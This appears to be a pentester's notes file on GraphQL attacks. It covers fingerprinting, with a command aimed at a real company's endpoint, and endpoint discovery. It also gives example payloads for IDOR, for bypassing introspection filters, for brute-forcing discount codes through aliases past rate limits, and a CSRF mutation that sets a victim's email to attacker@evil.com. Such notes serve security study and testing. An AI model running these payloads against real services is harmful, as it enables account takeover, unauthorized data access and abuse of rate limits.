# Fingerprint
```bash
git clone https://github.com/dolevf/graphw00f.git && cd graphw00f

# edit config file to specify UA and headers first
python main.py -d -f -t https://www.datacamp.com/groups/graphql
```

# Client
https://github.com/graphql/graphiql
```bash
npx graphiql
sudo npm install -g graphiql && graphiql

# http://localhost:4000/graphql
```

# Visualize introspected schema

# Test for graphql endpoints
Universal query
```graphql
query{__typename}
```
always returns
```json
{"data": {"__typename": "query"}}
```

Common endpoint names:
* /graphql
* /api
* /api/graphql
* /graphql/api
* /graphql/graphql
If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path. 

request methods
Common is `POST` with `application/json`, but it can variate.

#  Exploiting unsanitized arguments
For example:
```graphql
query {
	products {
		id
		name
		listed
	}
}
```
   returns
```graphql
    {
        "data": {
            "products": [
                {
                    "id": 1,
					...
                },
                {
                    "id": 2,
					...
                },
                {
                    "id": 4,
					...
                }
            ]
        }
    }
```        
so we can try to access the third product: [[IDOR]]
```graphql
query {
	product(id: 3) {
		id
		name
		listed
	}
}
```    
#  Discovering schema information
### Introspection 
###### Burp Suite:
`GraphQL > Set introspection query`
##### Request example
```graphql
{
	"query": "{__schema{queryType{name}}}"
}
```
######  Visualizing introspection results 
https://graphql-kit.com/graphql-voyager/
 http://nathanrandal.com/graphql-visualizer/
### Suggestions
Used when instrospection is disabled.
Suggestions are messages like this:
`There is no entry for 'productInfo'. Did you mean 'productInformation' instead?`
Can be automated with https://github.com/nikitastupin/clairvoyance or Burp scanner.

###  Bypassing GraphQL introspection defenses 
`__schema` can be disabled using regex by developers.
```graphql
{
	"query": "query{__schema
	{queryType{name}}}"
}
```
Also try a `GET` request, or a `POST` request with a content-type of `x-www-form-urlencoded`.

# Bypassing rate limiting using aliases
#rate-limiting [[Brute Force]] #auth 
Aliases allows to make several queries inside one HTTP request.
It can be used for brute-force. Example:
```graphql
query isValidDiscount() {
	isvalidDiscount(code: 1){
		valid
	}
	isValidDiscount2:isValidDiscount(code: 2){
		valid
	}
	isValidDiscount3:isValidDiscount(code: 3){
		valid
	}
}
```

# Graphql [[CSRF]]
Possible if graphql endpoint doesn't validate `Content-Type` and `x-www-form-urlencoded` works.
Example:
```
query=mutation changeEmail($input: ChangeEmailInput!) {changeEmail(input: $input) {email}}&variables={"input":{"email":"attacker@evil.com"}}
```


# Tools
```
git clone --depth 1 https://github.com/dolevf/graphql-cop && cd graphql-cop

python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```
